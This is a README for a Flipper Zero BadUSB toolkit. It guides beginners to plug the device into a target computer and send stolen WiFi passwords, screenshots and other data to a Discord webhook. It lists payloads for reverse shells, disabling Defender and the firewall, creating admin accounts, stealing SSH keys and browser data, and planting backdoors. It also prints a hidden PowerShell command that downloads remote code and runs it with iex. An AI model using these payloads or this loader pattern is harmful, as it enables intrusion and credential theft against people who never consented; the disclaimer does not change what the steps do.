# Flipper Zero BadUSB - Modular Payload System

<div align="center">

![Flipper Zero](https://img.shields.io/badge/Flipper%20Zero-FF6600?style=for-the-badge&logo=flipboard&logoColor=white)
![PowerShell](https://img.shields.io/badge/PowerShell-5391FE?style=for-the-badge&logo=powershell&logoColor=white)
![Bash](https://img.shields.io/badge/Bash-4EAA25?style=for-the-badge&logo=gnu-bash&logoColor=white)
![License](https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0-lightgrey?style=for-the-badge)

**A next-generation modular payload system for Flipper Zero BadUSB**

*Ultra-minimal DuckyScript loaders that pull remote PowerShell/Bash modules*

[Quick Start](#-quick-start) • [Payloads](#-available-payloads) • [Configuration](#-configuration) • [Documentation](#-documentation)

</div>

---

## Why This System?

| Feature | Traditional | This System |
|---------|-------------|-------------|
| **Payload Size** | 50+ lines | **~15 lines** |
| **Updates** | Edit every file | **Update remote once** |
| **Configuration** | Hardcoded values | **Environment variables** |
| **Multi-platform** | Separate scripts | **Same modules** |
| **Modularity** | Monolithic | **Mix & match** |
| **Discord/Dropbox** | Manual setup | **Built-in** |

---

## Quick Start (Complete Beginners)

**Never used Flipper BadUSB before?** Follow these 5 easy steps:

### Step 1: Get a Discord Webhook

**Why?** This is where your Flipper will send stolen data (WiFi passwords, screenshots, etc.)

1. Open Discord and create/open any server
2. Right-click the server name → **Server Settings**
3. Click **Integrations** → **Webhooks** → **New Webhook**
4. Click **Copy Webhook URL**  
 You'll get something like: `https://discord.com/api/webhooks/1234567890/AbCdEf...`

### Step 2: Pick a Payload

**Start simple! Try these first:**

| Payload | What it does | Needs Config? |
|---------|-------------|---------------|
| `payloads/windows/fun/rickroll.txt` | Opens Rick Roll video | ❌ No |
| `payloads/windows/exfiltration/wifi_grabber.txt` | Steals WiFi passwords → Discord | ✅ Yes |
| `payloads/windows/exfiltration/screenshot.txt` | Takes screenshot → Discord | ✅ Yes |

**Tip**: Start with Rick Roll to test everything works!

### Step 3: Configure (If Needed)

Open your `.txt` file in **any text editor** (Notepad works fine)

**Find this line:**
```
STRING powershell ... '$env:DC='YOUR_DISCORD_WEBHOOK';...
```

**Change `YOUR_DISCORD_WEBHOOK` to your actual webhook:**
```
STRING powershell ... '$env:DC='https://discord.com/api/webhooks/1234567890/AbCdEf...';...
```

**That's it!** Save the file.

### Step 4: Copy to Flipper

Connect Flipper to your computer via USB:

1. Open **qFlipper** app (or use SD card reader)
2. Navigate to: `SD Card` → `badusb` folder  
   (Create `badusb` folder if it doesn't exist)
3. **Drag and drop** your `.txt` file into `badusb/`

### Step 5: Run on Target

1. On Flipper: `Apps` → `Bad USB` → Select your payload
2. Plug Flipper into target computer's USB port
3. Press **OK button** on Flipper to run
4. Check Discord for results!

---

## Available Payloads

### Windows

| Category | Payloads |
|----------|----------|
| **Exfiltration** | `wifi_grabber` `screenshot` `system_info` `browser_data` `ip_info` `full_exfil` |
| **Execution** | `reverse_shell` `create_admin` `enable_rdp` `disable_defender` `disable_firewall` |
| **Fun** | `rickroll` `fake_bsod` `wallpaper` `tts_message` |
| **Recon** | `full_recon` |
| **Persistence** | `persist` |

### Linux

| Category | Payloads |
|----------|----------|
| **Exfiltration** | `wifi_grabber` `system_info` `ssh_keys` `full_exfil` |
| **Execution** | `reverse_shell` |
| **Fun** | `rickroll` `wallpaper` `tts_message` |
| **Recon** | `full_recon` |
| **Persistence** | `cron_backdoor` |

### macOS

| Category | Payloads |
|----------|----------|
| **Exfiltration** | `wifi_grabber` `system_info` |
| **Execution** | `reverse_shell` |
| **Fun** | `rickroll` `tts_message` |
| **Recon** | `full_recon` |

### iOS

| Category | Payloads |
|----------|----------|
| **Execution** | `open_url` `open_settings` |
| **Pranks** | `rickroll` `send_message` `take_screenshot` |

> **Note:** iOS payloads cannot be modular (no terminal access)

---

## Configuration

### Environment Variables

| Variable | Purpose | Used By |
|----------|---------|---------|
| `DC` | Discord webhook URL | All exfil payloads |
| `DB` | Dropbox token | Dropbox uploads |
| `M` | Module to load | All payloads |
| `IP` | Attacker IP | Reverse shells |
| `PT` | Port number | Reverse shells |
| `U` | Custom URL | Wallpaper, downloads |
| `MSG` | Custom message | TTS payloads |

### Example Configuration

```duckyscript
REM WiFi grabber with Discord webhook
STRING powershell -w h -ep bypass "$env:DC='https://discord.com/api/webhooks/123/abc';$env:M='wifi';irm https://raw.githubusercontent.com/.../loader.ps1|iex"
```

---

## Repository Structure

```
FlipperZero_BadUSB/
├── payloads/                    # DuckyScript files (copy to Flipper)
│   ├── windows/
│   │   ├── exfiltration/
│   │   ├── execution/
│   │   ├── fun/
│   │   ├── recon/
│   │   └── persistence/
│   ├── linux/
│   ├── macos/
│   └── ios/
├── remote-payloads/             # Remote modules (hosted on GitHub)
│   ├── loaders/
│   │   ├── loader.ps1           # Windows universal loader
│   │   └── loader.sh            # Linux/macOS universal loader
│   ├── windows/
│   ├── linux/
│   └── macos/
├── tools/                       # Helper tools
│   ├── modular_generator.py     # Payload generator
│   ├── payload_configurator.py  # Configuration tool
│   └── validate_ducky.py        # Syntax validator
└── docs/
```

---

## 🛠️ Tools

### Modular Generator

Interactive tool to generate configured payloads:

```bash
python3 tools/modular_generator.py
```

### Payload Configurator

Configure existing payloads:

```bash
python3 tools/payload_configurator.py payloads/windows/exfiltration/wifi_grabber.txt
```

### DuckyScript Validator

Validate payload syntax:

```bash
python3 tools/validate_ducky.py payloads/
```

---

## 🔧 Forking This Repo

If you fork this repo, update the base URL in:

1. `remote-payloads/loaders/loader.ps1` (line 20)
2. `remote-payloads/loaders/loader.sh` (line 15)

```
https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/remote-payloads
```

---

## 📖 Documentation

| Document | Description |
|----------|-------------|
| [QUICKSTART.md](QUICKSTART.md) | Getting started guide |
| [DISCLAIMER.md](DISCLAIMER.md) | Legal disclaimer |
| [CONTRIBUTING.md](CONTRIBUTING.md) | How to contribute |
| [SECURITY.md](SECURITY.md) | Security policy |
| [payloads/README.md](payloads/README.md) | Payload documentation |
| [remote-payloads/README.md](remote-payloads/README.md) | Remote module docs |

---

## Legal Disclaimer

**THIS SOFTWARE IS FOR AUTHORIZED SECURITY TESTING ONLY**

- ✅ Use on systems you **own**
- ✅ Use with **explicit written permission**
- ✅ Use in **isolated test environments**
- ❌ **NEVER** use without authorization
- ❌ **NEVER** use for malicious purposes

Unauthorized access to computer systems is **illegal** and punishable by law. The authors are not responsible for any misuse.

See [DISCLAIMER.md](DISCLAIMER.md) for full terms.

---

## License

This project is licensed under **CC BY-NC-SA 4.0**

- ✅ Share and adapt
- ✅ Give credit
- ❌ No commercial use
- ✅ Share alike

---

## Credits

- **dil1thium** - Original author
- **Flipper Zero Community** - Inspiration and testing

---

<div align="center">

**Made with 🧡 for security researchers**

*Remember: With great power comes great responsibility*

</div>
